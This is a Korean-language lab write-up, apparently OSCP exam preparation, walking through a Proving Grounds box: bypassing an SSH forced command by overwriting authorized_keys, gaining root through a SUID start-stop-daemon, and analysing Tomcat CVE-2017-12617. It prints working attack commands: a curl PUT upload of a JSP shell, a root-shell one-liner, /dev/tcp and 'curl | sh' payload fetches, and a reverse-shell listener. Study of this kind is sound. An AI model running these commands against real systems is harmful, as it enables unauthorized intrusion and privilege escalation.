> 둘 다 강제 명령으로 대체되고, **둘 다 원래 요청이 `SSH_ORIGINAL_COMMAND`에 노출된다.** 이 래퍼가 그 변수를 인용 없이 셸에 넘기는 것이 바로 두 번째 공격면이다(2-2 note).

> [!danger] 강제 명령/제한 셸 환경에서 `scp`가 실패하면 **가장 먼저 `-O`를 붙여본다**
> 증상이 헷갈린다 — 인증은 되는데 전송만 안 되거나, 서버 스크립트의 거부 메시지가 나온다. "키가 틀렸나?"로 새면 시간을 크게 잃는다.
> 반대 방향의 함정도 있다: 아주 오래된 서버에서 최신 `scp`가 실패할 때도 `-O`가 답이다.
> **대안**: `-O` 없이 같은 일을 하려면 `ssh -i id_rsa max@target 'scp -t /home/max/.ssh/authorized_keys' < authorized_keys` 처럼 **직접 `scp -t` 프로토콜을 태우는 것**도 가능하다 [가정] — 이 박스에서는 시도하지 않았다.

### 2-5. 배경 지식 ② — SUID와 `start-stop-daemon`

**SUID(Set-User-ID) 비트**가 붙은 실행 파일은 실행할 때 **실효 UID(euid)가 파일 소유자로 바뀐다.** 소유자가 root면 그 프로세스는 root 권한으로 돈다. 정당한 용도가 있다(`passwd`가 `/etc/shadow`를 쓰려면 필요하다). 문제는 **셸이나 임의 명령 실행이 가능한 프로그램에 SUID가 붙었을 때**다.

`start-stop-daemon`은 Debian의 init 스크립트가 데몬을 띄우고 내리는 데 쓰는 도구다. **`-x` 로 지정한 임의 실행 파일을 실행하는 기능**이 본질이다. root SUID가 붙으면 그건 곧 **"임의 프로그램을 root로 실행"** 이다.

```bash
/usr/sbin/start-stop-daemon -S -x /bin/sh -- -p
```

| 조각 | 역할 | 빼면 어떻게 되는가 |
|---|---|---|
| `-S` (`--start`) | 데몬 시작 모드 | 없으면 무엇을 할지 몰라 사용법만 출력한다 |
| `-x /bin/sh` (`--exec`) | 실행할 프로그램 | 이게 페이로드다. `/bin/sh` 대신 `/bin/bash`도 되지만 **bash는 아래 `-p` 문제에서 더 까다롭다** |
| `--` | 옵션 종료 구분자 | **빼면 뒤의 `-p`를 `start-stop-daemon` 자신의 옵션(`--pidfile`)으로 해석해 실패한다.** 반드시 필요 |
| `-p` (뒤쪽, `sh`에게 전달) | **privileged 모드 — euid≠uid일 때 특권을 버리지 않는다** | **빼면 셸이 뜨긴 하는데 root가 아니다.** 이 박스 전체에서 가장 중요한 한 글자 |

> [!danger] `sh -p`의 `-p`가 없으면 SUID 셸은 무용지물이다
> 데비안의 `/bin/sh`는 **dash**다. `dash(1)`의 `-p` 정의를 그대로 읽자:
> > "Do not attempt to reset effective uid if it does not match uid. This is not set by default to help avoid incorrect usage by setuid root programs via `system(3)` or `popen(3)`."
>
> 즉 dash는 **기본적으로 `euid != uid`면 euid를 uid로 되돌린다.** SUID로 얻은 root를 스스로 버리는 것이다. `-p`가 그 초기화를 막는다.
> 같은 이유로 `system("/bin/sh")` 형태의 SUID C 래퍼는 **`setuid(0)`를 먼저 호출**해야 한다.
> **주의**: bash의 `-p`는 의미가 다르고(특권 모드에서 환경 초기화를 건너뛴다), OpenBSD `sh(1)`에는 이 `-p` 옵션이 아예 없다. **근거로 인용할 man page는 dash다.**

> [!tip] SUID 목록을 읽는 법 — "정상"과 "이상"의 경계선
> 아래는 **정상**이다(어느 데비안에나 있다): `passwd` · `su` · `sudo` · `mount` · `umount` · `newgrp` · `chfn` · `chsh` · `gpasswd` · `fusermount` · `pkexec` · `ping`
> **이상 신호**는 이런 것들이다:
> - 목록에 **없어야 할 관리 도구** — `start-stop-daemon` · `systemctl` · `docker` · `env` · `find` · `nmap` · `vim` · `python3.x` · `perl`
> - **비표준 경로**의 SUID — `/opt/*` · `/usr/local/bin/*` · 홈 디렉터리
> - **커스텀 이름**의 바이너리 — 박스 제작자가 심은 것
>
> 판정은 항상 **GTFOBins**로: https://gtfobins.github.io/#+suid

### 2-6. 참고 — Tomcat 7.0.4와 CVE-2017-12617 (이 박스에서는 쓰지 않았다)

8080의 `Apache Tomcat 7.0.4`를 보고 반사적으로 떠올린 것이 **CVE-2017-12617 (JSP Upload Bypass RCE)** 였고, 실제로 익스플로잇을 내려받았다(6장 ④). **최종 경로에는 쓰이지 않았지만 유형 자체가 시험 단골이므로 메커니즘만 정리해 둔다.**

**아파치 공지 원문** (security-7/8/9 페이지에 동일 문장으로 실려 있다):

> When running with HTTP PUTs enabled (e.g. via setting the `readonly` initialisation parameter of the Default servlet to false) it was possible to upload a JSP file to the server via a specially crafted request. This JSP could then be requested and any code it contained would be executed by the server.

**영향 범위와 패치 버전** (Apache Tomcat 보안 공지 기준):

| 브랜치 | 영향 받는 버전 | 패치 버전 | 공지일 |
|---|---|---|---|
| 7.0.x | **7.0.0 – 7.0.81** | **7.0.82** | 2017-10-04 |
| 8.0.x | 8.0.0.RC1 – 8.0.46 | 8.0.47 | 2017-10-04 |
| 8.5.x | 8.5.0 – 8.5.22 | 8.5.23 | 2017-10-01 |
| 9.0.x | 9.0.0.M1 – 9.0.0 | 9.0.1 | 2017-09-30 |

**이 박스의 `7.0.4`는 범위 안이다.** (참고: 아파치 아카이브에 순수한 `7.0.4`는 없고 **`v7.0.4-beta`** 로 배포됐다. 7.0.x 초기는 베타로 나갔고 `v7.0.6`이 첫 정식 디렉터리다.)

> [!note] CVE-2017-12615 와 무엇이 다른가
> 두 CVE의 아파치 공지 문장은 거의 같은데 **한 구절이 다르다**:
> - **CVE-2017-12615**: "When running **on Windows** with HTTP PUTs enabled…" — **Windows 한정**, 7.0.0 – 7.0.79, 7.0.81에서 수정
> - **CVE-2017-12617**: 같은 문장에서 **OS 한정 구절이 없다** — 전 OS, 4개 브랜치 전체
>
> 흔히 "12615의 불완전한 패치가 12617"이라고 설명하지만, **아파치 공지도 MITRE 레코드도 "incomplete fix"라는 표현을 쓰지 않는다.** 1차 사료로 말할 수 있는 것은 **OS 적용 범위의 차이**와, 아래 커밋 이력이 보여주는 **기존 검사의 불충분함**까지다.

**전제조건 — 이게 없으면 성립하지 않는다.**
Tomcat DefaultServlet의 `readonly` 초기화 파라미터 **기본값은 `true`** 다. 공식 문서에 이렇게 적혀 있다:

> **readonly** — Is this context "read only", so HTTP commands like PUT and DELETE are rejected? **[true]**

(Tomcat 문서는 `[값]` 표기로 기본값을 나타낸다.) 실제로 배포판의 `conf/web.xml`에는 `default` 서블릿에 `debug`와 `listings`만 선언돼 있고 **`readonly` 파라미터 자체가 없다.** 즉 **스톡 설치는 PUT/DELETE를 거부**하며, 관리자가 명시적으로 `<param-name>readonly</param-name><param-value>false</param-value>`를 넣어야만 취약해진다.

**왜 `.jsp/` 트레일링 슬래시가 확장자 필터를 우회하는가 — 매퍼 코드 수준**

핵심은 필터가 아니라 **Tomcat 매퍼의 확장자 매칭 로직**이다. `Mapper.internalMapExtensionWrapper()`는 이렇게 생겼다:

```java
int slash = -1;
for (int i = pathEnd - 1; i >= servletPath; i--) {
    if (buf[i] == '/') { slash = i; break; }
}
if (slash >= 0) {
    int period = -1;
    for (int i = pathEnd - 1; i > slash; i--) {
        if (buf[i] == '.') { period = i; break; }
    }
    if (period >= 0) { /* ... MappingMatch.EXTENSION ... */ }
}
```

`/shell.jsp/` 를 넣어 보자:

1. 뒤에서부터 `/`를 찾는다 → **마지막 문자가 `/`** 이므로 `slash == pathEnd - 1`
2. 확장자용 `.`를 찾는 안쪽 루프의 조건은 `i > slash`, 시작값은 `i = pathEnd - 1`. **`slash`와 같으므로 루프가 한 번도 안 돈다**
3. `period`는 `-1`인 채로 남고 → **확장자 매칭 자체가 시도되지 않는다**
4. `*.jsp` 매핑(JspServlet)에 걸리지 않고 **"Rule 7 — Default servlet"** 으로 떨어진다 → DefaultServlet이 PUT을 처리한다

즉 **`.jsp`가 마지막 경로 세그먼트에 있지 않기 때문에 매퍼의 눈에 안 보인다.** 그리고 파일을 쓸 때는 Java `File` API가 **뒤의 `/`를 조용히 떨어뜨려서** 디스크에는 `shell.jsp`로 저장된다. 이후 `GET /shell.jsp`(슬래시 없이)는 정상적으로 `*.jsp`에 매칭돼 **컴파일·실행**된다.

**패치가 무엇을 고쳤는가 (1차 사료: 아파치 공식 미러의 실제 커밋)**

- `b577f9a…` — "Partial fix for CVE-2017-12617 … Still need to address the case where the resource does not exist (e.g. PUT)". `DefaultServlet`에 있던 트레일링 슬래시 검사를 **`AbstractFileResourceSet`으로 옮겨** GET/POST/HEAD/OPTIONS 외의 메서드에도 적용되게 했다
- `b7e0435…` — **PUT 구멍을 실제로 막은 커밋.** `DirResourceSet.write()`에 다음을 추가:
  ```java
  // write() is meant to create a file so ensure that the path doesn't
  // end in '/'
  if (path.endsWith("/")) {
      return false;
  }
  ```

> [!danger] 자주 틀리는 지점 — 패치 위치
> 이 CVE 해설 중에 "`DefaultServlet`을 고쳤다" 또는 "`isSpecialFile()` 검사를 추가했다"고 적힌 글이 많다. **9.0/8.5 계열의 실제 수정은 `DirResourceSet.write()` 와 `AbstractFileResourceSet`이고, `Mapper`도 `DefaultServlet`도 `isSpecialFile`도 아니다.**
> 단, **7.0.x 계열은 WebResource API 이전 코드베이스라 수정 구조가 다르다.** 위 스니펫을 7.0.x에 그대로 일반화하지 않는다 [가정 아님 — 7.0.x 패치 코드는 확인하지 못했다].

**수동 재현 — 파이썬 익스플로잇 없이 (⚠️ 시험 대비 필수)**

```bash
# 0단계: 전제조건 검증 — PUT이 허용되는가 (30초 안에 끝낸다)
curl -i -X OPTIONS http://192.168.120.100:8080/
#   Allow: 헤더에 PUT이 없으면 즉시 이 경로를 버린다

# 1단계: 트레일링 슬래시로 JSP 업로드
curl -i -X PUT --data-binary @shell.jsp \
  'http://192.168.120.100:8080/shell.jsp/'
#   201 Created 또는 204 No Content 면 성공

# 2단계: 슬래시 없이 요청 → 컴파일·실행
curl 'http://192.168.120.100:8080/shell.jsp?cmd=id'
```

| 조각 | 역할 | 빼면 어떻게 되는가 |
|---|---|---|
| `-X PUT` | 메서드 강제 | GET으로는 아무 일도 안 일어난다 |
| `--data-binary @shell.jsp` | **파일을 가공 없이** 전송 | `-d @shell.jsp`를 쓰면 curl이 **줄바꿈을 제거**해 JSP가 깨진다. 반드시 `--data-binary` |
| **끝의 `/`** | 매퍼의 확장자 매칭 회피 | **빼면 `*.jsp` 매핑에 걸려 JspServlet이 처리하고, PUT은 405로 거부된다.** 이 한 글자가 CVE 전부다 |
| 2단계에서 슬래시 **없음** | JspServlet으로 라우팅 | 슬래시를 붙이면 DefaultServlet이 소스를 그냥 돌려주거나 404다 |

이 노트에서 사용한 익스플로잇(`~/PG/Sorcerer/CVE-2017-12617/CVE-2017-12617.py`)도 내부적으로 **정확히 같은 일**을 한다 — `requests.put()` 대상 URL이 `'http://' + target_ip + ':' + target_port + '//revshell.jsp/'` 이고, 201/204를 성공 판정으로 쓰며, 이후 `/revshell.jsp`를 GET한다. **자동 도구가 하는 일을 curl 두 줄로 대체할 수 있다는 것을 알면 시험에서 도구 금지가 문제가 되지 않는다.**

> [!warning] 이 스크립트는 시험에서 쓰지 마라
> `CVE-2017-12617.py`는 **페이로드 생성 + 업로드 + 리스너 기동 + 트리거**를 한 번에 하는 **자동 익스플로잇**이다. OSCP 규정상 위험한 분류다.
> 위의 `curl -X PUT` 2줄 + 별도 `nc -lvnp 4444`로 **완전히 동일한 결과**를 낼 수 있다. JSP 리버스셸 본문은 스크립트의 `payload` 변수를 그대로 파일로 저장해 쓰면 된다(그건 페이로드지 도구가 아니다).

---

## 3. Foothold — 강제 명령을 스스로 덮어쓴다

### 3-1. 먼저 확인 — `tomcat` 계정으로는 SSH가 안 된다

```bash
┌──(kali㉿kali)-[~/PG/Sorcerer/max]
└─$ ssh tomcat@192.168.120.100
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
tomcat@192.168.120.100: Permission denied (publickey).
```

`Permission denied (publickey)` — 서버가 **패스워드 인증을 아예 받지 않는다**(`PasswordAuthentication no`). 즉 `VTUD2XxJjf5LPmu6`는 **SSH에서는 쓸 수 없고**, 8080의 Tomcat manager 화면에서만 의미가 있다.

> [!tip] `Permission denied (publickey)` 는 "패스워드가 틀렸다"가 아니다
> 괄호 안이 서버가 **허용하는 인증 방식 목록**이다.
> - `(publickey)` → 패스워드 인증 비활성. **패스워드를 아무리 맞춰도 소용없다.** 키를 찾아라
> - `(publickey,password)` → 둘 다 열려 있다. 패스워드 공략이 유효하다
>
> 이 한 줄을 못 읽으면 없는 패스워드를 찾느라 시간을 태운다.

### 3-2. 제한된 채널로 접속해 보기

```bash
┌──(kali㉿kali)-[~/PG/Sorcerer/max/.ssh]
└─$ ssh -i id_rsa max@192.168.120.100
```

`command=`와 `no-pty` 때문에 대화형 셸은 뜨지 않고 래퍼의 `ACCESS DENIED.` 경로로 떨어진다. **키는 맞다** — 인증은 통과했고 제한만 걸린 상태다. 이 구분이 중요하다(6장 ②).

### 3-3. `authorized_keys` 덮어쓰기

옵션 필드를 제거한 파일을 만들어 **같은 경로로 올린다**:

```bash
┌──(kali㉿kali)-[~/PG/Sorcerer/max/.ssh]
└─$ scp -O -i id_rsa authorized_keys max@192.168.120.100:/home/max/.ssh/authorized_keys
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
authorized_keys                                                      100%  738     8.0KB/s   00:00
```

`100% 738` — **738바이트가 전부 전송됐다.** 이게 유일한 성공 신호다.

> [!warning] "응답이 성공을 뜻하지 않는다" — 여기서는 반대로 **크기까지 확인**한다
> 누적 패턴([[Crane]] · [[RubyDome]] · [[Astronaut]] · [[Exghost]] · [[Hawat]] · [[Squid]]).
> scp는 원격에서 실패해도 로컬이 조용할 수 있다. **전송 바이트 수가 원본과 같은지** 확인하고, 가능하면 되읽어서 대조한다:
> ```bash
> scp -O -i id_rsa max@192.168.120.100:/home/max/.ssh/authorized_keys ./verify.txt
> diff authorized_keys verify.txt && echo "덮어쓰기 확인"
> ```

### 3-4. 완전한 셸

```bash
┌──(kali㉿kali)-[~/PG/Sorcerer/max/.ssh]
└─$ ssh -i id_rsa max@192.168.120.100
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Last login: Fri Jul 10 00:50:54 2026 from 192.168.45.215
max@sorcerer:~$ whoami
max
```

![[Pasted image 20260710140254.png]]

> [!tip] SSH로 잡은 셸은 이미 완전한 TTY다
> 리버스셸이었다면 `python3 -c 'import pty; pty.spawn("/bin/bash")'` → `Ctrl+Z` → `stty raw -echo; fg` 업그레이드가 필요하다. **SSH는 그 단계를 건너뛴다.**
> 이것이 "키를 찾아 SSH로 들어가는 경로"가 리버스셸보다 항상 나은 이유다 — 안정적이고, 끊겨도 재접속이 즉시 된다.

> [!warning] `⚠️ 시험 금지 도구 아님` — 이 foothold는 전부 수동이다
> `ssh`·`scp`·`unzip`·`wget`만 썼다. 자동 익스플로잇 도구가 하나도 없으므로 **OSCP 시험에서 그대로 재현 가능**하다.
> 디렉터리 열거에 쓴 feroxbuster는 시험에서 허용된다(자동 익스플로잇 도구가 아니다). 그래도 수동 대안을 적어 둔다:
> ```bash
> for w in $(cat wordlist.txt); do
>   code=$(curl -s -o /dev/null -w '%{http_code}' "http://192.168.120.100:7742/$w/")
>   [ "$code" != "404" ] && echo "$code $w"
> done
> ```

---

## 4. 권한상승

### 4-1. 셸을 잡자마자 치는 5개

```bash
max@sorcerer:~$ id
max@sorcerer:~$ sudo -l
max@sorcerer:~$ find / -perm -4000 -type f 2>/dev/null
max@sorcerer:~$ getcap -r / 2>/dev/null
max@sorcerer:~$ cat /etc/crontab; ls -la /etc/cron.d/
```

이 박스에서 답을 준 것은 **3번**이다.

### 4-2. 실제로는 linpeas를 돌렸다

```bash
max@sorcerer:~$ wget 192.168.45.215/linpeas.sh -O linpeas.sh
--2026-07-10 01:32:27--  http://192.168.45.215/linpeas.sh
Connecting to 192.168.45.215:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 975444 (953K) [application/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                100%[====================================>] 952.58K  1.68MB/s    in 0.6s

2026-07-10 01:32:28 (1.68 MB/s) - ‘linpeas.sh’ saved [975444/975444]

max@sorcerer:~$ ls -al
total 992
drwxr-xr-x 3 max  max    4096 Jul 10 01:32 .
drwxr-xr-x 7 root root   4096 Sep 24  2020 ..
-rw------- 1 max  max       5 Jul 10 00:49 .bash_history
-rw-r--r-- 1 max  max     220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 max  max    3526 Apr 18  2019 .bashrc
-rw-r--r-- 1 max  max  975444 Dec 15  2025 linpeas.sh
-rw-r--r-- 1 max  max     807 Apr 18  2019 .profile
-rwxr-xr-x 1 max  max     133 Sep 24  2020 scp_wrapper.sh
drwx------ 2 max  max    4096 Sep 24  2020 .ssh
-rw-r--r-- 1 max  max    1991 Sep 24  2020 tomcat-users.xml.bak

max@sorcerer:~$ chmod 744 linpeas.sh
```

![[Pasted image 20260710143311.png]]

> [!note] 칼리에서 파일을 넘기는 방법 3종 — 하나가 막히면 다음
> ```bash
> # 공격자 측
> python3 -m http.server 80
> # 타겟 측 (우선순위대로)
> wget http://192.168.45.215/linpeas.sh -O /tmp/linpeas.sh
> curl -o /tmp/linpeas.sh http://192.168.45.215/linpeas.sh
> # 둘 다 없으면 (bash 내장 /dev/tcp)
> exec 3<>/dev/tcp/192.168.45.215/80; echo -e "GET /linpeas.sh HTTP/1.0\r\n" >&3; cat <&3 > /tmp/l.sh
> ```
> **이 박스에서는 SSH가 이미 있으므로 `scp`가 가장 확실하다**: `scp -i id_rsa linpeas.sh max@192.168.120.100:/tmp/`
> 그리고 **디스크에 안 남기는 방법**: `curl http://.../linpeas.sh | sh` — 포렌식 흔적을 줄인다.

> [!danger] `⚠️ 시험 금지 아님, 그러나 수동 대안을 반드시 몸에 익혀라
> linpeas는 자동 **익스플로잇** 도구가 아니라 **열거** 스크립트이므로 OSCP 시험에서 허용된다.
> 문제는 다른 데 있다 — **1000줄 출력에서 정답을 못 찾는 것**, 그리고 **AV/모니터링이 있는 환경에서 안 도는 것**. 수동 한 줄이 항상 답이다:
> ```bash
> find / -perm -4000 -type f 2>/dev/null          # SUID
> find / -perm -2000 -type f 2>/dev/null          # SGID
> find / -writable -type d 2>/dev/null            # 쓰기 가능 디렉터리
> getcap -r / 2>/dev/null                         # capabilities
> ```
> `-perm -4000`의 **선행 `-`가 핵심**이다. "정확히 4000"이 아니라 **"4000 비트를 포함"** 이라는 뜻이다. 빼면(`-perm 4000`) 다른 퍼미션 비트가 하나라도 있는 파일은 전부 누락된다 — 즉 **거의 아무것도 안 나온다.**

### 4-3. SUID 목록 — `start-stop-daemon` 발견

```bash
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
                      ╚════════════════════════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
strings Not Found
strace Not Found
-rwsr-xr-x 1 root root 113K Jun 24  2020 /usr/sbin/mount.nfs
-rwsr-xr-x 1 root root 44K Jun  3  2019 /usr/sbin/start-stop-daemon
-rwsr-xr-x 1 root root 63K Jul 27  2018 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 35K Apr 22  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 63K Jan 10  2019 /usr/bin/su
-rwsr-xr-x 1 root root 51K Jan 10  2019 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 15K Oct  9  2019 /usr/bin/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 53K Jul 27  2018 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 35K Jan 10  2019 /usr/bin/umount  --->  BSD/Linux(08-1996)
```

![[Pasted image 20260710150807.png]]

**이 목록을 읽는 순서:**

| 항목 | 판정 |
|---|---|
| `passwd`·`su`·`mount`·`umount`·`newgrp`·`chfn`·`fusermount` | **정상.** 데비안 기본 SUID |
| `vmware-user-suid-wrapper` | VMware Tools 기본. 정상 |
| `mount.nfs` | 정상이지만 **NFS가 떠 있는 박스**라 눈여겨볼 값어치는 있다 |
| **`/usr/sbin/start-stop-daemon`** | **비정상.** 데비안 기본은 SUID가 **아니다**(`-rwxr-xr-x`). 박스 제작자가 붙였다 |

> [!danger] linpeas의 `--->` 화살표에 낚이지 마라
> `passwd --->  Apple_Mac_OSX(03-2006)/Solaris_8/9...` 같은 주석은 **2000년대 초 다른 OS의 옛 취약점 목록**이다. 데비안 10의 `passwd`와 아무 관계가 없다.
> 정작 **정답인 `start-stop-daemon`에는 화살표가 없다.** 도구가 강조한 것이 아니라 **"여기 있으면 안 되는 것"** 을 사람이 알아본 것이다.
> **linpeas의 색과 화살표를 신뢰하지 말고 목록 전체를 표준 SUID 집합과 대조하라.**

GTFOBins에서 확인:

![[Pasted image 20260710151033.png]]

### 4-4. root 획득

```bash
max@sorcerer:/run/systemd$ /usr/sbin/start-stop-daemon -S -x /bin/sh -- -p
# whoami
root
# cat /root/proof.txt
621b7558ae3578abef3e8f4c73485357
```

![[Pasted image 20260710151116.png]]

> [!note] 이 명령은 GTFOBins의 SUID 항목과 **글자 그대로 동일**하다
> GTFOBins `start-stop-daemon` 페이지는 셋을 싣고 있다:
> - Shell(일반) / Sudo — `start-stop-daemon -S -x /bin/sh`
> - **SUID — `start-stop-daemon -S -x /bin/sh -- -p`**
>
> GTFOBins의 단서: **기본 셸이 SUID 특권을 버리지 않는 배포판에서는 `-p`를 빼라.** 데비안의 `/bin/sh`는 dash고 dash는 버리므로 **여기서는 `-p`가 필수**다.

> [!warning] 안 될 때 의심할 것 — `-S`는 "이미 돌고 있으면 아무것도 안 한다"
> `start-stop-daemon(8)`의 `-S`/`--start` 정의는 이렇다: *"Check for the existence of a specified process. If such a process exists, start-stop-daemon does nothing, and exits with error status 1"*.
> 즉 **`-x /bin/sh` 인스턴스가 이미 떠 있으면 조용히 종료 코드 1을 내고 끝난다.** 셸이 안 뜨는데 에러도 없으면 이걸 의심하고, 아직 안 떠 있는 실행 파일로 바꿔 본다:
> ```bash
> cp /bin/sh /tmp/x && /usr/sbin/start-stop-daemon -S -x /tmp/x -- -p
> ```
> `-x`는 **절대 경로여야 한다**(man: "The executable argument should be an absolute pathname").

> [!tip] 다른 후보 경로 — 실제로는 안 갔지만 우열을 비교해 둔다
> | 후보 | 성립 조건 | 이 박스에서의 판정 |
> |---|---|---|
> | **SUID `start-stop-daemon`** | 그냥 성립 | ✅ **채택.** 한 줄, 즉시, 재현 100% |
> | **NFS `no_root_squash`** | 익스포트가 있고 `no_root_squash` | ❓ **미확인**([가정] — `showmount` 기록 없음). 성립했다면 칼리에서 SUID 셸을 심어 실행하는 정석 경로 |
> | **커널 익스플로잇 (CVE-2021-22555)** | 커널 버전 일치 + ip_tables 모듈 | ❌ **버렸다**(6장 ⑤). 오프셋이 Ubuntu 5.8/COS 5.4 전용이고 이 박스는 Debian 10 |
> | **Tomcat manager (`tomcat`/`VTUD2XxJjf5LPmu6`)** | manager 앱 접근 + WAR 배포 | ⚠️ **불필요.** 설령 성공해도 얻는 것은 `tomcat` 사용자이지 root가 아니다. **root를 이미 손에 쥔 뒤에 옆길로 새면 시간 손해** |
>
> **원칙: 커널 익스플로잇은 항상 마지막이다.** 박스를 죽일 수 있고(시험에서 리버트는 시간 손실), 성공률이 낮고, 오설정 경로가 거의 항상 존재한다.

---

## 5. 플래그

| 플래그 | 위치 | 값 |
|---|---|---|
| `local.txt` | `/home/max/local.txt` (표준 위치) | **원본 기록에 텍스트로 남아 있지 않다** — 스크린샷에만 존재 |
| `proof.txt` | `/root/proof.txt` | `621b7558ae3578abef3e8f4c73485357` |

![[Pasted image 20260710151215.png]]

> [!danger] 시험 증거 형식 — 플래그만 찍으면 인정 안 된다
> OSCP는 `whoami`·`hostname`·`ip a`와 플래그가 **한 화면**에 있어야 한다. 습관을 지금 만든다:
> ```bash
> # cat /root/proof.txt; echo "---"; whoami; hostname; ip a | grep 'inet '; date
> ```
> `date`까지 넣으면 순서 증명이 된다.

> [!warning] `local.txt` 값을 텍스트로 남기지 않은 것이 이 노트의 실수다
> 스크린샷은 **검색이 안 되고 복사가 안 된다.** 표준([[_WRITEUP-STANDARD]])이 "터미널 출력은 캡처하지 않는다"고 못박은 이유가 정확히 이것이다.
> 값을 지어내지 않고 **누락으로 기록**한다.

---

## 6. 막혔던 지점 / 시행착오

> [!abstract] 이 박스는 **7월 8일 17:43에 시작해 7월 10일 15:11에 끝났다**
> 산출물 타임스탬프가 남긴 실제 흐름이다. 실작업 시간은 훨씬 짧지만, **두 번 옆길로 샜다** — 그 두 번이 이 장의 핵심이다.

### ① 로그인 폼에 기본 자격증명을 먼저 던졌다

7742의 폼을 보자마자 `admin/admin`, `root/root`를 넣었다. 실패.

**무엇이 잘못이었나** — 커스텀 앱의 로그인 폼은 **기본 자격증명이라는 개념 자체가 없을** 때가 많다. 제품이 아니라 박스 제작자가 만든 페이지이기 때문이다.
**어떻게 알아챘나** — 실패 후 디렉터리 열거로 방향을 돌렸고, 거기서 바로 답이 나왔다.
**교훈** — **폼은 마지막에 공략한다.** 열거 → 소스/주석 → robots.txt → 그 다음이 자격증명이다. 특히 **`PasswordField`가 있다고 해서 그게 공격면이라는 뜻은 아니다.**

### ② SSH가 붙는데 셸이 안 뜬다 — "인증 실패"와 "제한"을 구분하라

키를 얻어 접속했는데 대화형 셸 대신 래퍼가 개입한다. 여기서 **"키가 잘못됐나?"** 로 새면 크게 잃는다.

**구분 기준:**

| 증상 | 의미 | 다음 수 |
|---|---|---|
| `Permission denied (publickey)` | **인증 실패.** 키가 안 맞거나 계정이 없다 | 키/사용자명 재확인 |
| 접속은 되는데 프롬프트 대신 메시지/즉시 종료 | **인증 성공 + 제한.** `command=`·`no-pty`·제한 셸(rbash) | **`authorized_keys`를 손에 넣었다면 옵션 필드를 읽어라** |
| `PTY allocation request failed` | `no-pty` | `ssh -T`로 비대화형 명령만 시도 |

**이 박스가 특별히 친절한 점** — `authorized_keys`가 zip에 들어 있어서 **제한의 정체를 미리 읽을 수 있었다.** 실전에서는 못 읽는다. 그럴 때는 다음을 시도한다:

```bash
ssh -i id_rsa max@target 'id'                 # 강제 명령 여부 확인
ssh -i id_rsa max@target -T 'bash -i'         # PTY 없이 셸 시도
ssh -i id_rsa max@target -o RemoteCommand=none -N   # 세션만 유지
```

### ③ `scp`가 조용히 거부당했다 — `-O` 한 글자

`authorized_keys`를 올리려는데 래퍼의 `case 'scp'*` 검사를 통과하지 못했다. 원인은 **최신 OpenSSH의 `scp`가 SFTP 서브시스템을 기본으로 쓰기 때문**이다(2-4).

![[Pasted image 20260710135852.png]]

**어떻게 알아챘나** — `scp_wrapper.sh` 원문을 읽고 "서버는 `scp`로 시작하는 명령만 통과시킨다"는 것을 알았으므로, **내 `scp`가 서버에 무엇을 보내는지**를 의심할 수 있었다.
**얼마나 걸렸나** — 산출물로는 측정 불가. **래퍼 소스를 읽지 않았다면 훨씬 오래 걸렸을 지점이다.**
**교훈** — **거부 메시지를 만들어내는 서버측 코드를 손에 쥐고 있으면, 내 클라이언트가 무엇을 보내는지를 의심하는 방향으로 사고가 열린다.** 소스를 먼저 읽어라.

### ④ 버린 경로 (1) — Tomcat CVE-2017-12617

**7월 8일 17:56**, nmap 종료 12분 뒤에 익스플로잇을 클론했다:

```bash
┌──(kali㉿kali)-[~/PG/Sorcerer]
└─$ git clone https://github.com/LongWayHomie/CVE-2017-12617.git
```

(산출물 `~/PG/Sorcerer/CVE-2017-12617/.git/logs/HEAD` 에 클론 기록이 남아 있다.)

**왜 이 방향이었나** — `Apache Tomcat 7.0.4`는 10년 이상 묵은 버전이고, 7.0.x 계열은 CVE-2017-12617의 영향 범위 안이다. 자연스러운 첫 가설이었다.

**왜 실패했나** — **산출물에 실행 로그가 없다.** 시도했는지, 시도해서 실패했는지 확인할 수 없다. 다만 확실한 것 둘:
1. **최종 경로에 Tomcat이 전혀 쓰이지 않았다** — foothold는 7742의 zip이었다
2. **이 CVE는 `readonly=false` 오설정이 없으면 성립하지 않는다.** 스톡 Tomcat은 PUT을 거부한다 (2-6)

따라서 **[가정]**: PUT이 거부되어(405/403) 경로가 막혔고, 방향을 7742로 돌렸다.

> [!danger] CVE 번호가 버전 범위에 들어간다 ≠ 취약하다
> 이것이 이 장에서 가장 비싼 교훈이다. **거의 모든 "설정 의존형" CVE**가 그렇다:
> - CVE-2017-12617 → `readonly=false` 필요
> - Tomcat manager RCE → 자격증명 + `manager-script` 롤 필요
> - 대부분의 WebDAV RCE → 쓰기 권한 필요
>
> **버전 매칭 후 30초 안에 전제조건을 검증하는 요청 한 방을 던져라.** 여기서는 그게 다음 한 줄이다:
> ```bash
> curl -i -X OPTIONS http://192.168.120.100:8080/
> # Allow: 헤더에 PUT이 있는가?
> ```
> 없으면 **즉시 버린다.** 이 검증에 5분 이상 쓰지 마라.

### ⑤ 버린 경로 (2) — 커널 익스플로잇 CVE-2021-22555를 컴파일까지 해놓고 안 썼다

**7월 10일 14:54~14:56**, 즉 **root를 잡기 15분 전**에 이 작업이 있었다:

```bash
┌──(kali㉿kali)-[~/PG/Sorcerer]
└─$ ls -la exploit exploit.c
